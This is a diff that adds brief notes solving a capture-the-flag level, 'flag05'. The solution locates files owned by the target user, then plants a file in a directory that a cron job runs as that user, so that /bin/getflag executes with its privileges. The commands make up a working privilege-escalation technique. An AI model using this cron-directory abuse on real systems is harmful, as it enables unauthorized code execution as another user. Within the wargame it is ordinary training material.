@@ -1,0 +1,6 @@
+1.	find directories or files from flag05:	find / -user flag05 2>/dev/null
+2.	analyse script
+3.	hint on mail
+4.	crontab -e */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+5.	create file in /usr/sbin/openarenaserver:	/bin/getflag > /tmp/<filename>
+6.	cat after 2mn
